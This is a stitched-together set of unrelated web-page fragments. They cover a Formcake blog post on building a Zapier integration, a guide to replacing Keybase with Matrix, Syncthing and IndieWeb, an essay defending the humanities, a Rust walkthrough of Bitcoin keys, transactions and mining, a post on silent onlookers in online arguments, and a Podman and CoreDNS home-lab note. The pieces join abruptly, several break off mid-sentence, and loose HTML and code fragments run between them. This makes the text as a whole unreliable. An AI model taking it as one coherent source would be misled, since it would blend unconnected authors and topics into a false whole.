<h2 id="1-authenticating-with-zapier">1) Authenticating with Zapier</h2>
<p>Zapier obviously needs a way to communicate with your app. The two options that we considered were OAuth2 and JTW tokens. We love OAuth2 with all of its control and flexibility. Honestly it would have been a great choice for Zapier. We however ended up choosing JWT instead. With OAuth2's power comes complexity and as a small SaaS app we wanted to keep things simple. Yes, having the user connect Zapier to Formcake would have been a little more straightforward, but we also knew that we did not want to use OAuth2 for our forthcoming user API. This API will allow users to access their data simply and securely and if you have ever had to use OAuth2 for an API where you just want to make a GET request, you many identify with our thinking. In our case, we adopted a new, Zapier-specific JWT strategy that lives alongside our existing JWT auth system.</p>
<p>With our new JWT auth token system, Formcake users can navigate to API Keys, create a Zapier API Key, and plug it into Zapier. They can also see the last time a key was used and can revoke those keys that are no longer needed or have become compromised. This worked particularly well for us because it dovetails nicely into the necessary infrastructure for our user API and we think our users will appreciate the simple process of passing a JTW token with API requests. It will also be extensible should we want to integrate more tightly with any other systems in the future.</p>

<h3 id="logging-into-formcake">Logging Into Formcake:</h3>
<p><img src="https://formcake.com/images/blog-posts/zapier-key-login.png" alt="Logging into formcake"></p>
<h2 id="2-polling-vs-webhook-trigger">2) Polling vs Webhook Trigger</h2>
<p>When you are setting up your Zapier integration, you have the option to create one of two types of "Triggers". You can either have Zapier regularly poll an endpoint in your API and then propagate any new changes it finds, or you can communicate with Zapier via webhooks, pushing out anything new on your end and triggering an immediate response.</p>
<p><img src="https://formcake.com/images/blog-posts/zapier-trigger-types.png" alt="Zapier polling vs webhook trigger options"></p>
<p>Of course for something like a form, the webhook method is critical, since when your form receives a submission you want it to, you know, <em>do</em> something, instead of quietly waiting for Zapier to get in touch. For those considering these options, know that creating a webhook system is not always the right choice. Creating a Polling Trigger is far more simple than creating a Webook Trigger. For data that does not change very often or has a limited set of data, polling can get your integration off the ground much faster and may be you all that you ever need. For Formcake's purposes, we knew that users would want to see something happen in Zapier immediately, especially when first creating and debugging their integration. A form could also have thousands of submissions, making polling simply not an option since Zapier would have to poll all submissions each time, creating a slower and slower process as our users get more and more value out of their forms.</p>
<h2 id="3-enable--disable">3) Enable / Disable</h2>
<p>Note that even with the webhook system in place, where we send data to Zapier instead of Zapier hitting our API, we still need to provide Zapier a way to authenticate with our app beyond simply logging the user in. This is because Zapier requires something else - a way to enable and disable webooks within our app. Zapier asks that you provide <code>/subscribe</code> and <code>/unsubscribe</code> endpoints that will turn your webhooks on and off. The <code>/subscribe</code> endpoint is meant to activate your webhook and also provide a webhook url to send your data to Zapier. This webhook url corresponds to a Zap in Zapier. The <code>/unsubscribe</code> endpoint simply turns off your webhook.</p>
<p>Within Formcake, these endpoints toggle an action's <code>active</code> property and also store the Zapier webhook url. On our own end, we use the <code>active</code> property in our own app frontend so that users can see on both platforms whether a Zap has been successfully connected. Zapier requires unsubscribing so that your app does not send data to Zapier after a Zap has been paused or deleted. Can you imagine the amount of unuseful API requests Zapier would recieve if they did not reserve the right to turn off your app's webhooks?</p>

<h2 id="4-preform-list-trigger">4) "Preform List" Trigger</h2>
<p>After giving Zapier a way to enable or disable your webhooks, your app also needs to provide a way to pull an example of whatever data your app will send to Zapier. This is accomplished in Zapier by using a Polling Trigger, but one that is not visible to the public and is only meant for other Zapier Triggers to use in order to get a list of information. In Zapier this is called a "Preform List" endpoint and is entirely optional. We would advise those making an integration use this option since it makes your Zapier integration far more useful. For Formcake, this endpoint returns a form's last 5 submissions.</p>
<h3 id="zapier-preform-list-in-action">Zapier Preform List In Action:</h3>
<p><img src="https://formcake.com/images/blog-posts/zapier-preform-list.png" alt="Zapier preform list"></p>
<h2 id="5-marketing-your-integration-beta-to-searchable">5) Marketing Your Integration (Beta to Searchable)</h2>
<p>After you are satisfied with your Zapier integration, you then need to develop a launch strategy in order to get your integration approved. Anyone is allowed to create a private integration but in order to have your integration publicly searchable on Zapier you have to satisfy a couple of requirements. Some of these are practical like providing a support contact so that Zapier can pass along support requests, but the real hurtle is getting 50 users to start using the integration. Zapier gives you access to a link that allows you to invite users to your integration. With this link users can beta test your Zap and you can tweak it to your users needs before submitting it to Zapier.</p>
<p><img src="https://formcake.com/images/blog-posts/zapier-share-page.png" alt="Zapier preform list"></p>
<h2 id="next-steps">Next Steps</h2>
<p>Formcake's Zapier integration is currently in beta so go ahead and <a href="https://formcake.com/documentation/actions#zapier-action">try it out</a>! Formcake's free plan nicely syncs up with Zapier's where each allow you 100 free submissions per month. If you have any feedback for the integration, please reach out to us at <a href="mailto:contact@formcake.com">contact@formcake.com</a>.</p>

There have been a few different alternatives proposed: this is <del>the best</del> mine.</p> <h2 id="-what-is-keybase">## What is Keybase?</h2> <p>Before we talk about replacing <a href="https://keybase.io/" rel="noopener noreferrer" target="_blank">Keybase</a>, we should have a good idea of what Keybase actually is. It's main features are as follows (ordered as on the website):</p> <ul> <li>E2EE chats and messaging (people and teams).</li> <li>Cryptographic identity verification from around the net.</li> <li><a href="https://book.keybase.io/docs/files" rel="noopener noreferrer" target="_blank">KBFS</a> (Public signed file hosting, private E2EE file storage w/ sharing, <a href="https://book.keybase.io/docs/files#keybase-pub" rel="noopener noreferrer" target="_blank">Static site hosting??</a>)</li> <li>Git repositories? Crypto? <a href="https://saltpack.org/" rel="noopener noreferrer" target="_blank">An alternative to PGP?</a></li> </ul> <h2 id="-previous-attempts-to-replace-keybase">## Previous Attempts to Replace Keybase</h2> <p>I'm not the first person to try this, obviously. Some brave folks have tried to build Keybase alternatives, such as <a href="https://keys.pub/" rel="noopener noreferrer" target="_blank">keys.pub</a> and the brand-new <a href="https://keyoxide.org/" rel="noopener noreferrer" target="_blank">Keyoxide</a>. I've tried both, but found that though they both are good in their own right, they are not the solutions that I am looking for.</p> <h2 id="-ok-time-for-the-steps">## OK Time for the Steps</h2> <h3 id="-step-1-chatmessaging">### Step #1: Chat/Messaging</h3> <p>There are a few great pre-existing options for encrypted messaging: <a href="https://signal.org/" rel="noopener noreferrer" target="_blank">Signal</a>, <a href="https://beta.protonmail.com/" rel="noopener noreferrer" target="_blank">ProtonMail</a> if you want to go full email, <a href="https://telegram.org/" rel="noopener noreferrer" target="_blank">Telegram</a>, and <a href="https://www.whatsapp.com/" rel="noopener noreferrer" target="_blank">WhatsApp</a>. However, they all have their problems (though I use the first two on a daily basis). Signal requires a phone number, and is more of an iMessage/text replacement than a Slack-style chat app. Protonmail is literally not chat – it's email. Telegram is <a href="https://news.ycombinator.com/item?id=6936539" rel="noopener noreferrer" target="_blank">not</a> <a href="https://translate.google.com/translate?hl=en&amp;sl=ru&amp;u=http://habrahabr.ru/post/206900/" rel="noopener noreferrer" target="_blank">secure</a>. If you use WhatsApp for security you might be crazy –&nbsp;I only use it because it's <em>the way</em> to communicate with people in the Middle East and Africa.</p> <p>Instead, I would recommend you use <a href="https://matrix.org/" rel="noopener noreferrer" target="_blank"><strong>Matrix</strong></a>. Matrix is an "open network for secure, decentralized communication," and it's the perfect replacement for Keybase's chat <del>and I would argue most other chat apps too</del>. It utilizes E2E encrypted messaging, and can be self-hosted as well <del>or if you're cheap like me just get your friend to host</del>.</p> <p>In addition to a Matrix server, you also need a client. For this, I recommend <a href="https://about.riot.im/" rel="noopener noreferrer" target="_blank"><strong>Riot</strong></a>. Riot is a beautiful Matrix client with a bunch of awesome features, including Slack-like integrations, and apps for pretty much every major platform (Linux, MacOS, Windows, iOS, Android, and a web client). <del>Plus it looks a lot like Discord.</del></p> <h3 id="-step-2-identity-verification">### Step #2: Identity verification</h3> <p>Replacing Keybase's <a href="https://web.archive.org/web/20140322062148/https://keybase.io/" rel="noopener noreferrer" target="_blank">original function</a> is probably the most difficult part of this tutorial: cryptographically verified identity proofs is a great and innovative idea. I would swap this out with an <a href="https://indieweb.org/" rel="noopener noreferrer" target="_blank"><strong>IndieWeb</strong></a> profile –&nbsp;one <a href="http://microformats.org/wiki/h-card" rel="noopener noreferrer" target="_blank">part</a> of the larger <a href="http://microformats.org/" rel="noopener noreferrer" target="_blank">microformats</a> HTML structure. There are some pretty great tutorials out there (I would recommend <a href="https://kevq.uk/how-to-create-an-indieweb-profile/" rel="noopener noreferrer" target="_blank">this one</a> by the fantastic <a href="https://kevq.uk/" rel="noopener noreferrer" target="_blank">Kev Quirk</a> and <a href="https://randomgeekery.org/post/2020/04/indieweb-h-cards/" rel="noopener noreferrer" target="_blank">this one</a> by <a href="https://randomgeekery.org/" rel="noopener noreferrer" target="_blank">Brian Wisti</a>), so I won't go into too much detail about exactly how to do that. However, it's important to note that though Kev recommends hiding your h-card with the <code>display: none;</code> property: <a href="https://indieweb.org/antipatterns#invisible_metadata" rel="noopener noreferrer" target="_blank">don't do that</a>. I just merged my about and contact pages onto my homepage, and added the microformats classes to my existing markup.</p> <p><img alt="My IndieWeb h-card" src="https://figbert.com/content/posts/how-to-replace-keybase-in-three-easy-steps/h-card.png"></p> <h3 id="-step-3-file-storage">### Step #3: File Storage</h3> <p>Replacing KBFS is easy to do, but hard to get right. Swapping to <a href="https://www.google.com/drive/" rel="noopener noreferrer" target="_blank">Google Drive</a> is probably the move that most people would make, but that abandons the entire security/encryption aspect of Keybase. There's also <a href="https://www.dropbox.com/" rel="noopener noreferrer" target="_blank">Dropbox</a>, but that has the same problems as above. <a href="https://twitter.com/ProtonMail/status/1278389663078768641" rel="noopener noreferrer" target="_blank">ProtonDrive</a> has potential, but it's not out yet. Enter <a href="https://syncthing.net/" rel="noopener noreferrer" target="_blank"><strong>Syncthing</strong></a>. <a href="https://tonsky.me/blog/syncthing/" rel="noopener noreferrer" target="_blank">Nikita Tonsky</a> wrote one of my favorite posts of all time about Syncthing – go read it. One reason Syncthing is so great is that it's not the same thing as KBFS or any of the other "Drive" solutions. Instead of being a file hosting system, it's a "continuous file synchronization program." You have no data limits other than your storage and no third-party to worry about. Plus, sharing folders is also incredibly easy. Just read the article.</p> <h3 id="-bonus-step-4-video-calling">### Bonus Step #4: Video Calling</h3> <p>It would be a shame to talk about text chat, or really any form of communication, in this new pandemic age without talking about video chat. After all, the whole reason I'm writing this article is because the new videocalling giant <a href="https://zoom.us/" rel="noopener noreferrer" target="_blank">Zoom</a>. So, how have I replaced Zoom and how does that relate to replacing Keybase? Well, Matrix happens to have a fantastic <a href="https://jitsi.org/" rel="noopener noreferrer" target="_blank">Jitsi Meet</a> <a href="https://matrix.org/blog/2020/04/06/running-your-own-secure-communication-service-with-matrix-and-jitsi" rel="noopener noreferrer" target="_blank">integration</a>. Plus, the folks over at Jitsi are <a href="https://jitsi.org/blog/e2ee/" rel="noopener noreferrer" target="_blank">working on E2E encryption for their calls</a>. I've integrated Jitsi Meet into my self-hosted instance of Matrix, and now all my videocalls are just that – mine!</p> <h2 id="-summary">## Summary</h2> <ul> <li>Swapped chat to Matrix and Riot.</li> <li>Swapped identity verification to Indieweb.</li> <li>Swapped file storage/sync to Syncthing.</li> <li>Added videocalling to chat program via Jitsi.</li> </ul> <h2 id="-conclusion">## Conclusion</h2> <p>Keybase is a great service, and the people who work there should be really proud of what they've built. However, given Zoom's aquisition of the company, the stability and security of the product have been called into question. So, ever one to hop on a hype train, I jumped ship. I'm really happy with my solution, and I'd love to hear your thoughts as well <del>as soon as I set up webcomments</del>.</p> </section></article></div>]]>

<p>I have been holding off writing something like this, because it is often such a well-worn topic and I hardly wanted to preach to the converted.  But at the same time, the humanities need all of the defenses they can get and I’ve found, looking at the genre, that my answers for why we need the humanities are rather different from the typical answer.</p>



<p>But first, the <strong>shameless plug</strong> that if <strong>you</strong>, yes <strong>you!</strong> want to support the humanities, you can support <em>this</em> humanist by sharing my writing, subscribing with the button below or by supporting me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>.  Your support enables me to continue telling you and other people to continue supporting me, a giant self-devouring<a href="https://en.wikipedia.org/wiki/Ouroboros"> ouroboros </a>of support that will grow to become so large it will crush the world (I look forward to regretting this joke in the future).</p>






<p>Edit: A friendly reminder to those in the comments: you will be <em>civil</em>.  This thread has prompted some spirited discussion.  That’s fine.  But it will remain polite.</p>



<h2>What Humanities?</h2>



<p>First, just to define my terms, <strong>what are the humanities</strong>?  Broadly, they are the disciplines that study human society (that is, that are concerned with humanity): language study, literature, philosophy, history, art history, archaeology, anthropology, and so on.  It is necessarily a bit of a fuzzy set.  But what I think defines the humanities more than subject matter is <strong>method</strong>; the humanities study things which (we argue) <em>cannot</em> be subjected to the rigors of the scientific method or strictly mathematical approaches.  You cannot perform a controlled trial in beauty, mathematical certainty in history is almost always impossible, and there is no way to know much stress a society can bear except to see it fail.  Some things cannot be reduced to numbers, at least not by the powers of the technology-aided human mind.</p>



<p>By way of example, that methodological difference is why there’s a division between <strong>political science</strong> and <strong>history</strong>, despite the two disciplines historically being concerned with many of the same subjects and the same questions (to the point that Thucydides is sometimes produced as the founder of both):<strong> they use different methods</strong>.  History is a humanities discipline through and through, whereas political science attempts to hybridize humanities and STEM (Science, Technology, Engineering and Mathematics) approaches; that’s not to say historians never use statistical approaches (I do, actually, quite a lot) but that there are very real differences in methodology.  As you might imagine, that difference leads to some <a href="https://warontherocks.com/2020/06/want-better-strategists-teach-social-science/">competition </a>and <a href="https://warontherocks.com/2020/05/finally-getting-serious-about-professional-military-education/">conflict </a>between the disciplines as to whose methodology best answers those key questions or equips students to think about them.  Given that I have a doctorate in history and self-identify as a historian, you will have no trouble guessing which side of this I come down on, although that might be a bit self-interested on my part.</p>

I was struck reading this (and the Genji Monogatari; the two works were paired in the course) by how radically different the culture was from any of the ones I knew.  It was one of the first moments I ‘got’ the ‘past is a foreign country’ thing.  At the same time, when I later dug deeper into Roman martial culture, the commonalities between Roman elite military virtue and the values of the Tale of the Heike were striking.  The human part of ‘the human experience’ is common, even if the experience part is not.<br>Since this isn’t a topic where visual illustration is strictly on-point, I am going to use the images here to share some of the works outside of Greek and Roman history, which I encountered in my education in the humanities which influenced me and my thinking.</figcaption></figure>



<p>So if the STEM fields are, at some level, fundamentally about numbers, the humanities are <strong>fundamentally about language</strong>.  The universe may be made of numbers, but the human mind and human societies are constructed out of language.  Unlike computers, we do not think in numbers, but in words and consequently, the study of humans as <em>thinking</em> creatures is mostly about those words (yes, yes, I see you there, economics and psychology; there are edge cases, of course).  Our laws are written in words because our thoughts form <em>in our heads</em> as words; we naturally reason with words and we even <em>feel</em> with words.  Humans are linguistic creations in a mathematical universe; consequently, while the study of the universe is mediated through math, the study of humans and human minds is fundamentally linguistic in nature.</p>



<p>Thus, the humanities.</p>



<h2>Oh, the Humanities!</h2>



<p>Now I want to note here the standard defense of the humanities, which is that the study of human culture, literature and art enriches the soul and the experience of life.  <strong>This is, to be clear, undoubtedly true</strong>.  There is joy and richness in the incredible kaleidoscope of human expression and a deep wisdom in the realization of both how that expression joins us, and how radically different it can be.  There is also the enjoyment of developing a ‘palette’ for art and literature which is enhanced by knowing <em>more</em> of it, in being able to see the innovations and cross-connections (the ‘intertext’ to use the unnecessarily fancy academic term).  This is all very much the case.  There is a reason that rich people with abundant free time have consistently gravitated to the study of the humanities, or supported it.</p>



<p><strong>But this is a weak defense of the humanities as they are currently constructed</strong>.  The fact is that the academic humanities exist because people who <em>do not study the humanities</em> fund them.  The modern study of the humanities, in its infancy, was paid for by wealthy elites who wanted either that joyful richness or at least the status that came from funding it.  I should note here also that the humanities were never for the <em>teachers</em> of the humanities, but for its students.  The rich funders of the humanities were rarely the authors of the great treatises or studies; rather they wished to be the <em>readers of them</em> (and likewise, the modern academic humanities are not <em>for</em> professors, but the students we teach; more on this next time).  Down until really quite recently, education in the humanities was largely reserved for that elite and their academic clients.  As public support for the humanities continues to decline, many humanities fields seem in real danger of reverting back to that status: a prestigious toy for the already-rich and already-elite.</p>

In high school, I had largely been taught Greek mythology as a stand-alone idea, something the Greeks came up with all on their own – indeed, I was taught all of ancient Greek culture that was, as if it just sprang out of the ground.  Reading Kingship in Heaven – the myth of Teshub’s origin – was revelatory, because here was a forerunner to Hesiod’s Theogony, the foundation-stone for teaching Greek mythology.  <a href="https://www.amazon.com/East-Face-Helicon-Clarendon-Paperbacks/dp/0198152213">Hesiod had been borrowing</a>, he had been influenced and Greek mythology no longer stood on its own but slowly wrapped itself into an older, richer edifice of literature stretching back to the haziest beginnings of our knowledge.</figcaption></figure>



<p>Avoiding that retreat of the humanities back into the wealthy elite means defending the humanities on different grounds.  Of course, the traditional humanities will always survive at Harvard or Cambridge or Yale.  But for the humanities to actually be <em>generally</em> available, they need to survive, to thrive, outside of those spaces.  And yet, no good that is tethered to colleges can be justified solely through the benefit it gives the holder.  <strong>Colleges, after all, are publicly funded, but while everyone pays taxes, not everyone goes to college</strong>.  The OECD average rate for tertiary-education-completion among adults<a href="https://en.wikipedia.org/wiki/List_of_countries_by_tertiary_education_attainment"> is around 37% </a>and not all of those are four-year university degrees.  To break down the United States’ data, while 44% of Americans have completed some kind of tertiary education, putting the USA towards the top of the scale (and around two-thirds have at least <em>some</em> college, though they may not have completed it), <a href="https://en.wikipedia.org/wiki/Educational_attainment_in_the_United_States">only 35% of Americans have a four-year degree</a>.  And of course, only a subset of those degree-holders will have taken very much in the way of the humanities.  Which means <strong>the taxes that pay to fund the public universities that make up the great bulk of the study of the humanities are going to mostly come from people who have not, or could not, avail themselves of a humanistic education</strong>.</p>



<p>Even if we made the humanities available to all – a goal I robustly support (it is one reason I am spending all this time working on this open, free web platform, after all) – that effort would likely have to be publicly funded through a great many tax-payers who did not care to consume much of the <em>academic</em> products of the humanities (even if they consume many of its pop-cultural byproducts without knowing it).  <strong>We must be able to justify the expense to them</strong>.  And alas, while I love crowd-funding (did I mention, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>?), it is simply not an alternative for the research and teaching environment of the university (though I think it is and ought to be an important parallel model, for reasons I’ll get into in a moment).  The fact is that while ‘short’ essays, blog posts and public-facing books can be popularly funded, <strong>the slow, painstaking work that forms the <em>foundation</em> for those efforts has no ready popular market</strong>; but without the latter, the former withers (as a note: my <em>next</em> Collections post will be on the process by which knowledge filters from the latter to the former).</p>



<p><strong>We must be prepared to explain the value of the humanities to people for …</strong></p></div></div>

                <p>03 July 2020</p>
                <p>Understanding the fundamental building blocks(😉) of Bitcoin can be daunting for some developers. I find it difficult to meaningfully understand a system without knowing how everything fits together. </p>
                <p>A good way to go through this process is to lay down, however rudimentary, a set of processes by which the system operates. Hence the purpose of this guide is to explain through simple pieces of code, how Bitcoin works.</p>
                <p>Note: The intention is not to create a real implementation of the Bitcoin protocol. It also does not aim to explain every concept. Look for the embedded links if you find a concept you need to go over. Also look out for notes where concepts have been simplified and differ from the real Bitcoin implementation.</p>
                <p>Hopefully by the end of this series, we should have a bitcoin-like protocol anyone can run.</p>
                <p>The code written until this point is available <a href="https://github.com/monokh/nibble/tree/813d3d694d1ea0b6c71ce5854a1393e9deb61904">here</a>.</p>
                <p>From a very high level. This is bitcoin:</p>
                <pre id="code-main"><code>
let keypair = crypto::KeyPair::new();
let keypair2 = crypto::KeyPair::new();

let tx1 = create_signed_tx(&amp;keypair, keypair2.public_key, 123);
let tx2 = create_signed_tx(&amp;keypair2, keypair.public_key, 75);

let txs = vec![tx1, tx2];

let proposed_block = block::ProposedBlock {
    transactions: txs,
};

println!("Mining block with {} txs.", proposed_block.transactions.len());
let block = proposed_block.mine(3); // Difficulty 3 i.e. hash must begin with "000"
println!("Mined block: {:#?}", block);
                </code></pre>
                <p>We can split what we see here into the following categories:</p>
                <ul>
                    <li>Keys</li>
                    <li>Transactions</li>
                    <li>Blocks</li>
                    <li>Mining</li>
                </ul>

                <h2>Keys</h2>
                <p>Keys are required as a means to achieve ownership. In other words, you need to have the key to spend a certain amount of bitcoin.</p>
                <pre><code>
pub struct KeyPair {
    pub public_key: key::PublicKey,
    private_key: key::SecretKey,
}
                </code></pre>
                <p>Your keys actually consist of 2 parts. The private key and the public key. The public key can be shared with the world and is used to receive bitcoin, whereas the private key is something you keep secure as it can be used to spend your bitcoin. <a href="https://nakamoto.com/public-key-cryptography/#public-keys-as-identity">More on public key cryptography.</a></p>

                <h3>Creating keys</h3>
                <p>In bitcoin, <a href="https://hackernoon.com/what-is-the-math-behind-elliptic-curve-cryptography-f61b25253da3">eliptic curves are used for public key cryptography</a> - specifically secp256k1. In essense, using a (psuedo)random number we can generate a pair of keys that can be thought of as a user's wallet. </p>
                <pre><code>
let mut rand = rand::OsRng::new().unwrap();
let secp = Secp256k1::new();
let (private_key, public_key) = secp.generate_keypair(&amp;mut rand);
KeyPair {
    secp,
    public_key,
    private_key,
}
                </code></pre>

                <h2>Transaction</h2>
                <p>Transactions are the smallest unit of the Bitcoin system. A transaction is a data structure which encodes a payment of x bitcoins from a to b.</p>
                <p>In Bitcoin, transactions are not as simple as transferring a balance (account based), but rather a collection of inputs and outputs. This is generally called the <a href="https://en.wikipedia.org/wiki/Unspent_transaction_output">"UTXO model"</a>.</p>
                <pre><code>
pub struct Transaction {
    pub from: PublicKey,
    pub to: PublicKey,
    pub amount: u32
}
                </code></pre>
                <p>The public keys here are precisely from the key pairs that were generated. </p>
                <p>What then prevents anyone from transferring on behalf of others? Public key cryptography. To be a valid transaction and be accepted into the network by others, the transaction needs to be "Signed" by the `from` private key. </p>
                <pre><code>
impl KeyPair {
    pub fn sign(&amp;self, message: &amp;[u8]) -&gt; Signature {
        ...
        self.secp.sign(&amp;message, &amp;self.private_key);
    }
}
                </code></pre>

                <h3>Signed transaction</h3>
                <p>As mentioned previously, private keys exercise control over a number of bitcoins. A's private key is used to sign a transaction so that anyone can verify that the transaction from A to B was in fact authorised by A. </p>
                <pre><code>
let tx = transaction::Transaction {
    from: keypair.public_key,
    to,
    amount,
};

let sig = keypair.sign(&amp;tx.hash());

return transaction::SignedTransaction{
    transaction: tx,
    sig: sig.to_string(),
};
                </code></pre>

                <h2>Block</h2>
                <p>A block is a collection of transactions. These transactions should be signed and therefore valid.</p>
                <pre><code>
let tx1 = create_signed_tx(&amp;keypair, keypair2.public_key, 123);
let tx2 = create_signed_tx(&amp;keypair2, keypair.public_key, 75);

let txs = vec![tx1, tx2];

let proposed_block = block::ProposedBlock {
    transactions: txs,
};
                </code></pre>
                <p>In fact, on the bitcoin network, the only data which is replicated across are the blocks. The purpose of the block is to effectively write it's containing transactions into history. It achieves this by mining.</p>

                <h2>Mining</h2>
                <p>The process of <a href="https://en.bitcoin.it/wiki/Mining">mining</a> is to do a computation to ensure that there is something at stake. In other words, the miner has to prove they have done some work - <a href="https://en.bitcoin.it/wiki/Proof_of_work">"Proof of Work"</a></p>
                <p>To provide the correct proof of work for a block:</p>
                <ol>
                    <li>Serialise the block</li>
                    <li>Append a number</li>
                    <li>Hash it</li>
                    <li>Increment the number</li>
                    <li>Go back to 1</li>
                </ol>

                <p>The PoW is suffice if the hash begins with a certain number of 0s. The number of 0s required is called <a href="https://en.bitcoin.it/wiki/Difficulty">difficulty</a>. The more difficulty - the more 0s are required. </p>

                <p>In reality, the difficulty is defined on a more granular level. See <a href="https://en.bitcoin.it/wiki/Difficulty">difficulty on the bitcoin wiki</a> for more information.</p>

                <pre><code>
let mut nonce: u32 = 0;
let block_string = self.serialize();

loop {
    let block = format!("{}{}", block_string, nonce);
    let block_hash = hex::encode(crypto::sha256(block.clone()));
    if block_hash.starts_with(&amp;"0".repeat(difficulty)) {
        return Block {
            hash: block_hash,
            nonce,
            transactions: self.transactions
        }
    }
    nonce += 1;
}
                </code></pre>

                <p>You should hopefully now see how this all fits together. To recap the high level code <a href="#code-main">initially presented</a>:</p>

                <ol>
                    <li>Generate keypairs for each user</li>
                    <li>Using the private key of the user, sign transactions that move bitcoin</li>
                    <li>Combine these transactions in a "block"</li>
                    <li>Perform the PoW on this block until the difficulty condition is met</li>
                </ol>

                <p>Finally running this program will produce a block including the signed transactions. Take note of the hash. It begins with "000", therefore it is a valid block when difficulty is set to 3.</p>

                <pre><code>
Mining block with 2 txs.

July 3, 2020 | https://devonzuegel.com/post/the-silence-is-deafening | <a href="https://web.archive.org/web/*/https://devonzuegel.com/post/the-silence-is-deafening">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-type-cleanup="true">
                  <p>Imagine you're at a dinner party, and you're getting into a heated argument. As you start yelling, the other people quickly hush their voices and start glaring at you. None of the onlookers have to take further action—it's clear from their facial expressions that you're being a jerk.</p>

<p>In digital conversations, giving feedback requires more conscious effort. Silence is the default. Participants only get feedback from people who join the fray. They receive no signal about how the silent onlookers perceive their dialogue. In fact, they don't receive much signal that onlookers observed the conversation at all.<span><sup id="footnote-label--1">1</sup></span></p>

<p><span>As a result, the feedback you do receive in digital conversations is more polarized, because the only people who will engage are those who are willing to take that extra step and bear that cost of wading into a messy conversation. </span></p>

<p>When Angry Alice tweets something obnoxious or unproductive, reasonable people just scroll past it. If Alice develops a pattern of bad behavior, reasonable people will just unfollow, mute, or block her. The result is that it's hard for Alice to notice the silent majority of people who saw the trash fire and walked away when they recognized that engaging would only fuel its flames.</p>

<p>It gets worse—Angry Alice only sees feedback from extremists, so she doesn't receive more nuanced signals that might actually cause her to reflect on her behavior. <span>If no reasonable people give feedback, only the unreasonable people are left. </span>From Alice's perspective, the only people who disagree with her are jerks.</p>

<p>This is a coordination problem. Reasonable people understand that if they join the fray alone, they'll most likely be drowned out by the yelling, or worse they'll get dragged deeper into it. As a result, they choose stay out of it. </p>

<p>A huge part of the problem is that digital spaces generally have no equivalent of a disapproving glare. You're stuck choosing between staying silent and entering the fray, with few options in between. If you have little reason to believe that other reasonable people will back you up, you're going to stick with the default: silence.</p>

<p>This is a hard problem to solve, but it's not impossible. <span>You</span> can break the coordination trap! <span><sup id="footnote-label--2">2</sup></span></p>

<p>For example, I often send friendly DMs to combatants to share my perspective on how they could make combative Twitter threads more productive.</p>

<p>This works far better than you'd expect! In the last few years, I've DMed at least a dozen people who were being unreasonable or mean on Twitter. In all cases but one, it resulted in a constructive conversation between me and that person. In most cases, that in turn led to a retraction of their original tweet, a clarification of their position, or a marked improvement in subsequent discourse.</p>

<p>Four things I've found that make this approach more likely to succeed:</p><ol><li><p>You must show the person that you're not trying to attack them but to make them <span>more effective</span>. You're giving them feedback on process, not a moral lecture.</p></li><li><p>Bringing it into a private space<span><sup id="footnote-label--3">3</sup></span> like DMs is crucial, because it credibly shows that you're not trying to get brownie points from your in-group by bashing them in public.</p></li><li><p>This works better if the conversation at hand is in a thread you yourself started. It's a bit like giving feedback to someone at a party you're hosting—they're more likely to respect your boundaries in a social space you created. This is not a requirement, but it helps.</p></li><li><p>Make sure you're not dealing with a grifter. A grifter is someone who benefits from perpetuating the problem and has no actual desire to solve it (despite their rhetoric that may say otherwise). If they're a grifter, all the above advice is useless. Get away from the trash fire as fast as you can.</p></li></ol>
<p>I should note, this is a lot of work. There's a reason I've only done it about a dozen times over the last few years, even though there have been far, far more opportunities to do so. </p>

<p>But if everyone tried this method just a few times a year, then we just might break through this silence and raise the quality of our digital discourse.</p>

<p><span><p><span></span><span><span>1</span></span><span></span> The technical term for these silent onlookers is "lurkers".</p></span></p><p><span><p><span></span><span>2</span><span></span> Although this post is focused on how you as an individual can make a difference one conversation at a time, I'm even more excited about the structural opportunity that platforms have to enable users to express disapproval more subtly. <span>One idea I'd really like to see platforms like Twitter or Reddit try is to provide a mechanism for low-friction, private, negative feedback. For example, you could imagine offering a button where you can downvote or thumbs-down content (i.e. the opposite of a Like), but the count is only visible to the OP and not to anyone else. </span><span>EDIT 7/4/2020:</span><span> My friend Zooko </span><a href="https://twitter.com/zooko/status/1279492581655588864">evolved</a><span> this idea slightly, and I dig the suggestion: "</span><span>Imagine a "ಠ_ಠ" button on each tweet. The poster finds out how many people *THAT THEY FOLLOW* clicked that button, but can't find out specifically who. They just know that the crowd of people *that they respect* has a certain air of disapproval."</span><span></span></p></span></p><p><span><p><span></span><span>3</span><span></span> Of course the downside of this approach is that you don't get the opportunity to spread these norms to onlookers of the conversation. This is not always the right tradeoff! Public feedback can help onlookers understand reasons why they should not admire that behavior. But doing it privately makes it much more likely that that particular person will actually change their behavior, which is what I'm optimizing for in these cases.</p></span><span andale="" mono";"="">

</code></pre> <p>The network will look like this.</p> <p>CT-HOST is a Fedora32 laptop running Podman and will manage container lifecycles. The host resides on two networks: LAN (192.168.185.0/24) where devices communicate and CONTAINER-LAN (10.89.0.0/24) where containers communicate. The CONTAINER-LAN is virtual and created by the linux kernel.</p> <p>Containers may be exposed on "ct-host" to devices on LAN by port-forwarding the container's port onto the hosts. Not every container needs to have their ports forwarded but to achieve name resolution this is required.</p> <h2>Name Resolution</h2> <p>Name resolution provides mapping from a hostname to a service. This is encountered every time "www.google.com" is typed into a browser. The name "www.google.com" is resolved to an IP address where web servers provide this service. This lab creates the <code>ldelossa.net</code> local domain.</p> <p>Personally, I don't want to write RFC 1035 zone files, host ancient bind servers, or deal with cryptic configs. There is a certain beauty in the syntax of a hosts file. A simple text file which maps a hostname to an IP address suits my needs well. The answer was found in <a href="https://coredns.io/">CoreDNS</a> and its <a href="https://coredns.io/plugins/hosts/">hosts</a> plugin.</p> <p>On top of a terse syntax the "hosts" plugin provides dynamic reloading. Changes to the file holding your hostname mappings will reload the server, the changes taking effect soon after.</p> <h3>Podman</h3> <p>Podman is the container runtime used in this lab.</p> <p>Podman and Systemd play along nicely. Systemd services can be generated directly from Podman. These service files can be used to start the container on boot, restart it on failure, create dependencies between containers, or other facilities Systemd offers.</p> <h3>CoreDNS Container</h3> <p>configuration:</p> <pre><code><span>$</span><span> cat Corefile</span>
.:53 {
  cache 10
  forward . 8.8.8.8 9.9.9.9
  log
  errors
}

ldelossa.net {
  cache 10
  hosts /etc/coredns/hosts {
  }
}
<span>$</span><span> cat hosts</span>
192.168.185.10 traefik.ldelossa.net
192.168.185.10 ct-host.ldelossa.net
192.168.185.10 prom.ldelossa.net
